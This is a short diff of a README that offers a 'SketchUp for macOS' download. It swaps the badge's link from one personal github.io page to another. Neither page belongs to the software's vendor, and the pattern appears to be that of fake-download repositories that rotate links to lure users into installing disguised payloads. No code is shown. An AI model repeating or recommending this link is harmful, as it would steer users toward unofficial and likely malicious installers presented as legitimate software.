@@ -4,7 +4,7 @@
 
 ## 📥 Download SketchUp for macOS
 
-[![⬇️ Download SketchUp Mac](https://img.shields.io/badge/Download-SketchUp%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/SketchUp)
+[![⬇️ Download SketchUp Mac](https://img.shields.io/badge/Download-SketchUp%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/SketchUp)
 
 ---
 
